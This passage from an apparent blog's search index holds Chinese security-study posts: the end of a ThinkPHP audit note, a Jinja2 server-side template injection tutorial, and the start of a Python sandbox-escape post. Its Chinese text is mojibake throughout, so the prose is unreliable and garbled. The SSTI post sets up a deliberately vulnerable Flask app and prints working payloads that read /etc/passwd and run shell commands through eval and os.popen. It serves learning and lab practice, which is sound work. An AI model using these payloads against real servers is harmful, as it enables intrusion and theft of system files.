ï¼Œå‘ç°è¿™å‡ ä¸ªéƒ½æ˜¯å·®ä¸å¤šä»è·¯ç”±çš„æ£€æµ‹å¼€å§‹è·Ÿè¿›ï¼Œå…¶å®æƒ³æƒ³ä¹Ÿå¯¹ï¼Œæ¯•ç«Ÿpayloadä»urlä¸­æ¥ï¼Œè·Ÿè¿›æŸå‡½æ•°è·Ÿåˆ°åº•äº†å†è¿”å›ï¼Œæœ‰å¯èƒ½è¿™æ˜¯ä¸€ç§å¥—è·¯ï¼Œå…ˆè®°ä¸‹æ¥ã€‚ã€‚ã€‚</li><li>æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å®¡è®¡è¿™ç§ä¸œè¥¿ï¼Œæ¯•ç«ŸThinkPHP 5.0.x çš„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä»æ¼æ´æŠ€æœ¯å«é‡å’Œåˆ©ç”¨é“¾æ„é€ ä¸Šæ¥çœ‹ï¼Œç®—æ˜¯2018å¹´ä¸€ä¸ªå¾ˆç‰›çš„æ´äº†ï¼Œå¯¹æˆ‘è¿™ç§èœé¸¡ï¼Œå­¦ä¹ åˆ°å°±å¥½ã€‚</li></ol>]]></content>
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSTI-injection</title>
      <link href="/SSTI-injection.html"/>
      <url>/SSTI-injection.html</url>
      <content type="html"><![CDATA[<h3 id="å…ˆå…¥ä¸ªé—¨"><a href="#å…ˆå…¥ä¸ªé—¨" class="headerlink" title="å…ˆå…¥ä¸ªé—¨"></a>å…ˆå…¥ä¸ªé—¨</h3><h4 id="Jimja2"><a href="#Jimja2" class="headerlink" title="Jimja2"></a>Jimja2</h4><p><code>Jinja2</code>æ˜¯é»˜è®¤çš„ä»¿<code>Django</code>æ¨¡æ¿çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œç”±<code>Flask</code>çš„ä½œè€…å¼€å‘ã€‚ç½‘ä¸Šæœçš„è¯­æ³•<a id="more"></a>2333ï¼Œæ–¹ä¾¿è‡ªå·±å›é¡¾</p><h5 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ... &#125;&#125;ï¼šè£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°è¿™ä¸ªå˜é‡ä»£è¡¨çš„å€¼æ›¿æ¢æ‰ã€‚</span><br><span class="line">&#123;% ... %&#125;ï¼šè£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ã€‚</span><br><span class="line">&#123;# ... #&#125;ï¼šè£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼</span><br></pre></td></tr></table></figure><h5 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h5><p>åœ¨æ¨¡æ¿ä¸­æ·»åŠ å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ï¼ˆsetï¼‰è¯­å¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set name=&apos;xx&apos; %&#125;</span><br></pre></td></tr></table></figure><p><code>with</code>è¯­å¥æ¥åˆ›å»ºä¸€ä¸ªå†…éƒ¨çš„ä½œç”¨åŸŸï¼Œå°†<code>set</code>è¯­å¥æ”¾åœ¨å…¶ä¸­ï¼Œè¿™æ ·åˆ›å»ºçš„å˜é‡åªåœ¨<code>with</code>ä»£ç å—ä¸­æ‰æœ‰æ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with gg = 42 %&#125;</span><br><span class="line">&#123;&#123; gg &#125;&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><h5 id="ifè¯­å¥"><a href="#ifè¯­å¥" class="headerlink" title="ifè¯­å¥"></a>ifè¯­å¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ken.sick %&#125;</span><br><span class="line">Ken is sick.</span><br><span class="line">&#123;% elif ken.dead %&#125;</span><br><span class="line">You killed Ken! You bastard!!!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">Kenny looks okay --- so far</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h5 id="forè¯­å¥"><a href="#forè¯­å¥" class="headerlink" title="forè¯­å¥"></a>forè¯­å¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&#123;&#123; user.username|e &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="éå†"><a href="#éå†" class="headerlink" title="éå†"></a>éå†</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for key, value in &lt;strong&gt;my_dict.iteritems()&lt;/strong&gt; %&#125;</span><br><span class="line">&amp;lt;dt&amp;gt;&#123;&#123; key|e &#125;&#125;&amp;lt;/dt&amp;gt;</span><br><span class="line">&amp;lt;dd&amp;gt;&#123;&#123; value|e &#125;&#125;&amp;lt;/dd&amp;gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡"><a href="#Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡" class="headerlink" title="Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡"></a>Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡</h5><p>loop.index    å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»1å¼€å§‹ï¼‰<br>loop.index0    å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»0å¼€å§‹ï¼‰<br>loop.first    æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True\/False<br>loop.last    æ˜¯å¦æ˜¯æœ€åä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True\/False<br>loop.length    åºåˆ—çš„é•¿åº¦<br> æ³¨æ„ï¼šä¸å¯ä»¥ä½¿ç”¨continueå’Œbreakè¡¨è¾¾å¼æ¥æ§åˆ¶å¾ªç¯çš„æ‰§è¡Œã€‚</p><h5 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h5><p>è¿‡æ»¤å™¨æ˜¯é€šè¿‡<code>ï¼ˆ|ï¼‰</code>ç¬¦å·è¿›è¡Œä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š<code>0</code>ï¼šå°†è¿”å›nameçš„é•¿åº¦</p><p>ç±»ä¼¼äºæˆ‘ä»¬å¹³å¸¸çš„çš„å‡½æ•°ï¼Œä»–ä»–è¿™ç§åº”è¯¥å°±æ˜¯å†…ç½®å‡½æ•°ï¼Œå› ä¸ºå®ƒæœ¬èº«å°±å«æœ‰å¾ˆå¤šè¿‡æ»¤å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">abs(value)ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ã€‚ç¤ºä¾‹ï¼š-1|abs</span><br><span class="line">last(value)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ç¤ºä¾‹ï¼šnames|lastã€‚</span><br><span class="line">length(value)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ã€‚ç¤ºä¾‹ï¼šnames|lengthã€‚</span><br><span class="line">join(value,d=u&apos;&apos;)ï¼šå°†ä¸€ä¸ªåºåˆ—ç”¨dè¿™ä¸ªå‚æ•°çš„å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚</span><br><span class="line">int(value)ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ã€‚</span><br><span class="line">float(value)ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ã€‚</span><br><span class="line">lower(value)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚</span><br><span class="line">upper(value)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</span><br></pre></td></tr></table></figure><h3 id="æ¨¡æ¿æ³¨å…¥"><a href="#æ¨¡æ¿æ³¨å…¥" class="headerlink" title="æ¨¡æ¿æ³¨å…¥"></a>æ¨¡æ¿æ³¨å…¥</h3><p>ç®€å•åœ°è¯´è·Ÿè¿™ç§ç±»å‹çš„æ³¨å…¥è·Ÿä¸€èˆ¬çš„æ³¨å…¥æˆå› å…¶å®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿‡åˆ†ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥å¯¼è‡´çš„æ¼æ´ï¼Œè¿™æ ·ä¸€æ¥é€šè¿‡æ¨¡æ¿æ³¨å…¥å¯ä»¥å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œç­‰è¯¸å¤šæ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡å…³äºPHPçš„æ¨¡æ¿æ³¨å…¥ï¼Œå†™çš„æŒºå¥½ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<code>https://www.freebuf.com/vuls/83999.html</code>,ä½†è¿™ç¯‡æ–‡ç« PHP æ¨¡ç‰ˆå¼•æ“ Twig ä½œä¸ºä¾‹å­ï¼Œåªæ˜¯ç®€å•ä»‹ç»äº†ä¸€ä¸‹XSSçš„ç›¸å…³æ¼æ´ï¼Œå¹¶æ²¡æœ‰è§¦å‘æ›´å¤§çš„å±å®³ï¼Œä½†æ˜¯å¸¸è§„çš„æµ‹è¯•æ–¹æ³•å·²ç»å†™äº†å‡ºæ¥ï¼Œè·Ÿæµ‹è¯•æ³¨å…¥å…¶å®å·®ä¸å¤šï¼Œå°±æ˜¯æ¢äº†å†…å®¹è€Œå·²ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/07/ktayNt.png" alt="ktayNt.png"></p><p>æ‰€ä»¥ä¸‹é¢å°±è‡ªå·±æ­ä¸ªpythonçš„webç¯å¢ƒï¼Œä»¥å±å®³æ›´å¤§çš„<code>SSTIæ¨¡æ¿</code>æ³¨å…¥ä½œä¸ºä¾‹å­è¯´æ˜ï¼Œè¿™æ˜¯app.pyé‡Œé¢çš„ä»£ç å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å¾—å‡ºæ¥nameå‚æ•°ç›´æ¥ä»¥getæ–¹å¼è·å–ï¼Œç›´æ¥æ‹¼æ¥åœ¨Helloåé¢ä½œä¸ºæ¨¡æ¿ï¼Œç›´æ¥renderï¼Œè¿™å¾ˆæ˜æ˜¾nameå‚æ•°æ˜¯å¯æ§çš„ã€‚é—®é¢˜ä¹Ÿæ°å¥½æ˜¯å‡ºåœ¨è¿™ã€‚</p><p>å½“ç„¶è¿™é‡Œä¹Ÿæ˜¯æœ‰XSSçš„</p><p><img src="https://s2.ax1x.com/2019/02/07/ktJXGD.png" alt="ktJXGD.png"></p><p>ä½†æ˜¯é‡ç‚¹è¿˜æ˜¯æ”¾åœ¨è¯»æ–‡ä»¶è¿™ä¸€åŠŸèƒ½ä¸Šï¼Œè¿™ä¹Ÿç›¸å½“äºç›´æ¥RCEäº†ï¼Œå…ˆè¦å­¦ä¹ ä¸€ä¸‹ä¸‹é¢è¿™å‡ ä¸ªç±»ï¼Œ<code>__mro__</code>ä»¥åŠ<code>__subclasses__</code>å±æ€§ï¼Œå…¶å®è¿™é‡Œæœ‰ç‚¹åƒpythonæ²™ç›’ç»•è¿‡çš„æ„é€ æ–¹æ³•23333.</p><p><code>__mro__</code>ä¸­çš„MRO(Method Resolution Order)ä»£è¡¨ç€è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼Œå¯ä»¥çœ‹çœ‹<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__" target="_blank" rel="noopener">Pythonæ–‡æ¡£</a>ä¸­çš„ä»‹ç»ã€‚</p><p><code>__subclasses__</code>å±æ€§åœ¨è¿™é‡Œä½œä¸ºä¸€ç§æ–¹æ³•è¢«<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__" target="_blank" rel="noopener">å®šä¹‰</a>ä¸ºï¼Œå¯¹æ¯ä¸ªnew-style classâ€œä¸ºå®ƒçš„ç›´æ¥å­ç±»ç»´æŒä¸€ä¸ªå¼±å¼•ç”¨åˆ—è¡¨â€ï¼Œä¹‹åâ€œè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å­˜æ´»å¼•ç”¨çš„åˆ—è¡¨â€ã€‚</p><p>ä¸Šé¢çš„è¿™ä¸¤ä¸ªå±æ€§å¼•ç”¨è‡ªè¿™ç¯‡æ–‡ç« ï¼š<code>https://www.freebuf.com/articles/web/98928.html</code></p><p>ä¸ªäººç›´æ¥ç†è§£å°±æ˜¯<code>__mro__</code>ä¼šè¾“å‡ºå½“å‰å¯¹è±¡æ‰€è°ƒç”¨çš„å…¨éƒ¨ç±»åŒ…æ‹¬å…¶çˆ¶ç±»ï¼Œè€Œ<code>__subclasses__</code>ä¼šè¾“å‡ºè¯¥ç±»ä¸‹æ‰€æœ‰çš„å­ç±»ã€‚OKï¼Œè¿™æ ·å°±å¯ä»¥æ„‰å¿«çš„å¼€å§‹äº†</p><p>å…ˆæ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œè¾“å…¥å‚æ•°<code>25hello</code>ï¼Œæ˜æ˜¾å­˜åœ¨æ¼æ´</p><p><img src="https://s2.ax1x.com/2019/02/07/ktfbPU.png" alt="ktfbPU.png"></p><p>é¦–å…ˆæˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹ä¾¿æ˜¯é€‰æ‹©ä¸€ä¸ªnew-style objectç”¨äºè®¿é—®<code>object</code>åŸºç±»ã€‚å¯ä»¥ç®€å•çš„ä½¿ç”¨<code>&#39;&#39;</code>ï¼Œä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œ<code>str</code>å¯¹è±¡ç±»å‹ã€‚ä¹‹åå¯ä»¥ä½¿ç”¨<code>__mro__</code>å±æ€§è®¿é—®å¯¹è±¡çš„ç»§æ‰¿ç±»ã€‚å°†<code></code>ä½œä¸ºpayloadæ³¨å…¥åˆ°å­˜åœ¨SSTIæ¼æ´çš„é¡µé¢ä¸­</p><p><img src="https://s2.ax1x.com/2019/02/07/ktYYQJ.png" alt="ktYYQJ.png"></p><p>å‡ºç°ä¸¤ä¸ªç±»ï¼Œé€‰æ‹©ç¬¬äºŒä¸ªobjectåŸºç±»ï¼Œå¹¶æ˜¾ç¤ºè¯¥ç±»ä¸‹æ–¹çš„æ‰€æœ‰å­ç±»ï¼Œæ³¨å…¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/07/ktYReI.png" alt="ktYReI.png"></p><p>ä¸Šé¢é“¾æ¥çš„æ–‡ç« é‡Œé¢ä½¿ç”¨fileç±»å»è¿›è¡Œå¯¹æ–‡ä»¶çš„è¯»å†™æ“ä½œï¼Œpayload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯fileæ–¹æ³•åœ¨py3ä¸­å·²ç»ä¸æ”¯æŒï¼Œåªè¦æ‰¾åˆ°å¯ä»¥æ‰§è¡Œä»£ç çš„å‡½æ•°æˆ–è€…å…¶ä»–è¯»æ–‡ä»¶çš„å‡½æ•°éƒ½å¯ä»¥ï¼Œåœ¨vulhubä¸Šæ‰¾åˆ°çš„å¦å¤–ä¸€ä¸ªé€‚åˆpy3çš„ï¼Œåˆ©ç”¨äº†evalå‡½æ•°å»å®ç°RCEçš„åŠŸèƒ½ï¼Œå› ä¸ºæ‰§è¡Œè¯­å¥å»å®ç°çš„ï¼Œæ‰€ä»¥å¾—ç”¨%æ‹¬ä½ã€‚æ–¹æ³•ä¸æ­¢ä¸€ç§ï¼Œæ‰¾åˆ°å¯¹çš„ç»§æ‰¿é“¾å°±å¯ä»¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/07/ktNZbn.png" alt="ktNZbn.png"></p><p>æˆåŠŸè¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="https://s2.ax1x.com/2019/02/07/ktNMCT.png" alt="ktNMCT.png"></p><p>å¦å¤–å†æ‹¿</p><p>è¿™ä¸œè¥¿åªè¦æ‰¾å¯¹ç»§æ‰¿å…³ç³»ï¼Œè€Œä¸”ç»§æ‰¿å…³ç³»é‡Œé¢çš„æ–¹æ³•æ¸…æ¥šçš„è¯å°±å¾ˆå¿«è·å¾—æ•ˆæœï¼Œå½“ç„¶é˜²èŒƒçš„è¯å¾—ä»ä»£ç å±‚ä¸‹æ‰‹ï¼Œæ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥å°±å¯¹äº†ï¼Œå¯¹å¯æ§å˜é‡åšå¥½é˜²å¾¡XD</p><p>å‚è€ƒæ–‡ç« :</p><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></p><p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p><p><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>]]></content>
      
      <categories>
          
          <category> SSTIæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTIæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pythonæ²™ç›’ç»•è¿‡</title>
      <link href="/python-sandbox-bypass.html"/>
      <url>/python-sandbox-bypass.html</url>
      <content type="html"><![CDATA[<h3 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h3><p>ä¸€äº›å‡½æ•°éœ€è¦äº†è§£ä¸€ä¸‹ï¼Œè¿™ç¯‡æ–‡ç« è®²çš„å·²ç»å¾ˆè¯¦ç»†<a id="more"></a>äº†:<a href="https://xz.aliyun.com/t/2308#toc-12ï¼Œæ¦‚æ‹¬ä¸€ä¸‹åˆ†åˆ«æ˜¯ä¸‹é¢çš„å‡½æ•°" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12ï¼Œæ¦‚æ‹¬ä¸€ä¸‹åˆ†åˆ«æ˜¯ä¸‹é¢çš„å‡½æ•°</a></p><ul><li><code>__class__</code> :è¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»</li><li><code>__bases__</code> :è¿”å›ä¸€ä¸ªç±»<code>ç›´æ¥</code>æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå…ƒç»„å½¢å¼ï¼‰</li><li><code>__mro__</code> :åˆ—å‡ºè§£ææ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼Œç±»ä¼¼äºbases</li><li><code>__subclasses__()</code>ï¼šè¿”å›å­ç±»åˆ—è¡¨</li><li><code>__dict__</code> ï¼š åˆ—å‡ºå½“å‰å±æ€§/å‡½æ•°çš„å­—å…¸</li><li><code>func_globals</code>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨</li><li><code>__globals__</code>:è¿”å›ä¸€ä¸ªå½“å‰ç©ºé—´ä¸‹èƒ½ä½¿ç”¨çš„æ¨¡å—ï¼Œæ–¹æ³•å’Œå˜é‡çš„å­—å…¸</li></ul><p>ä¸Šé¢çš„æ¨¡å—ä¸­å¯ä»¥å°è¯•ç†è§£mroå’Œbasesä¹‹é—´çš„åŒºåˆ«ï¼Œä¸¤ä¸ªçš„ä¸œè¥¿è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„ï¼Œåªæ˜¯ä½œç”¨åœ¨ç»•è¿‡ä¸ŠåŠŸèƒ½ç±»ä¼¼ã€‚ä¸ªäººæ„Ÿè§‰mroçš„å‘å±•è¿‡ç¨‹æœ‰ç‚¹åƒä»dfsç¼–ç¨‹bfsã€‚ã€‚ã€‚</p><h3 id="diræ–¹æ³•"><a href="#diræ–¹æ³•" class="headerlink" title="diræ–¹æ³•"></a>diræ–¹æ³•</h3><ul><li>dir()åœ¨æ²¡æœ‰å‚æ•°çš„æ—¶å€™è¿”å›æœ¬åœ°ä½œç”¨åŸŸä¸­çš„åç§°åˆ—è¡¨</li><li>dir()åœ¨æœ‰å‚æ•°çš„æ—¶å€™è¿”å›è¯¥å¯¹è±¡çš„æœ‰æ•ˆå±æ€§åˆ—è¡¨</li></ul><p>å¯¹æ¯”ä¸€ä¸‹ä¸‹é¢çš„ä¾‹å­å°±çŸ¥é“äº†ï¼Œä»¥py2ä¸ºä¾‹ï¼š</p><p><img src="https://s2.ax1x.com/2019/02/07/ktIJLd.png" alt="ktIJLd.png"></p><h3 id="å†…è”æ¨¡å—"><a href="#å†…è”æ¨¡å—" class="headerlink" title="å†…è”æ¨¡å—"></a>å†…è”æ¨¡å—</h3><p>pythonä¸­å¯ä»¥ç›´æ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚<code>int(),list()</code>ç­‰ç­‰ã€‚è¿™äº›å‡½æ•°å¯ä»¥åœ¨å†…è”æ¨¡å—ä¸­å¯ä»¥æŸ¥åˆ°ã€‚</p><p>å¸¸ç”¨çš„æœ‰ä¸‹é¢ä¸¤ä¸ªï¼š<code>__import__</code>ä»¥åŠ<code>__builtins__</code>ï¼Œä½†æ˜¯åœ¨py2é‡Œé¢å†…ç½®æ¨¡å—åå­—å«<code>__builtin__</code>ï¼Œpy3æ”¹åå«<code>__builtins__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line">In [<span class="number">4</span>]: __builtin__</span><br><span class="line">Out[<span class="number">4</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: __builtins__</span><br><span class="line">Out[<span class="number">5</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="comment">#python 3.6</span></span><br><span class="line">In [<span class="number">2</span>]: __builtin__                                                                                             </span><br><span class="line">Out[<span class="number">2</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: __builtins__                                                                                    </span><br><span class="line">Out[<span class="number">3</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>åœ¨py2ä¸­ï¼Œåœ¨ä¸»æ¨¡å—<code>main</code>ä¸­ï¼Œ<code>__builtins__</code>æ˜¯å¯¹å†…å»ºæ¨¡å—<code>__builtin__</code>æœ¬èº«çš„å¼•ç”¨ï¼Œå³<code>__builtins__</code>å®Œå…¨ç­‰ä»·äº<code>__builtin__</code>ï¼ŒäºŒè€…å®Œå…¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œä¸åˆ†å½¼æ­¤ã€‚</p><p>éä¸»æ¨¡å—<code>main</code>ä¸­ï¼Œ<code>__builtins__</code>ä»…æ˜¯å¯¹<code>__builtin__.__dict__</code>çš„å¼•ç”¨ï¼Œè€Œé<code>__builtin__</code>æœ¬èº«</p><h3 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h3><p>å¦‚æœå¯¼å…¥çš„æ¨¡å—aä¸­æœ‰ç€å¦ä¸€ä¸ªæ¨¡å—bï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>a.b</code>çš„æ–¹æ³•æˆ–è€…<code>a.__dict__[b&lt;name&gt;]</code>çš„æ–¹æ³•é—´æ¥è®¿é—®æ¨¡å—bã€‚</p><h3 id="å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ"><a href="#å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ" class="headerlink" title="å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ"></a>å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ</h3><p>ä¸€èˆ¬è¯»å–ç›®å½•çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°<code>os.system</code>å‡½æ•°ï¼Œè¿™æ ·çš„ä¸€å¥è¯è¿™æ ·å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥æŠŠä¸€äº›å…³é”®æ¨¡å—ç»™åˆ æ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 